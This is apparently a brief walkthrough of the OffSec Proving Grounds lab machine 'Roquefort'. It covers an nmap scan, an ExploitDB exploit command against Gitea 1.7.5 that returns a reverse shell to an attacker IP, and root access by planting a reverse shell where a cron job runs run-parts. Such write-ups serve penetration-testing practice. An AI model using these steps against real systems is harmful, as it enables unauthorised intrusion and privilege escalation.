# Roquefort

## Info

Roquefort is an intermediate linux machine from offsec proving grounds.

## Nmap

All tcp port scan.

```
21/tcp   open   ftp     syn-ack ttl 61 ProFTPD 1.3.5b
22/tcp   open   ssh     syn-ack ttl 61 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
2222/tcp open   ssh     syn-ack ttl 61 Dropbear sshd 2016.74 (protocol 2.0)
3000/tcp open   ppp?    syn-ack ttl 61
```

## User

Gitea version 1.7.5 on port 3000 is vulnerable to the following exploitDB script.

```
/usr/share/exploitdb/exploits/multiple/webapps/49571.py
```

Set up a listener and execute.

```
python3 gitea_1_12_5.py -t http://192.168.179.67:3000 -u pentester -p password123 -I 192.168.45.214 -P 3000
```

## Root

After uploading pspy32, there is a cronjob running a run-parts binary.

Upload a reverse shell with the same name to the following directory and wait for a shell.

```
/usr/local/bin
```
